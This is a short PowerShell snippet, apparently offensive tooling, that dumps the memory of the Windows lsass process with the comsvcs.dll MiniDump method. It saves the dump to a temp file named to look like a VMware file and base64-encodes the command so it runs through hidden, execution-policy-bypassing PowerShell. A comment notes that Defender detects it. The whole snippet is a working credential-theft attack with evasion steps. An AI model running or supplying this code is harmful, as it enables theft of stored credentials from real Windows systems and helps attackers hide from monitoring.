#⚠ Detected by defender
$lsass_ProcId = (Get-Process -Name "lsass").Id
$lsass_MiniDump = "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_ProcId C:\Windows\Temp\vmware-vhost.dmp full"
$encodedMiniDumpCmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($lsass_MiniDump))
cmd.exe /c powershell -exec bypass -W hidden -nop -E $encodedMiniDumpCmd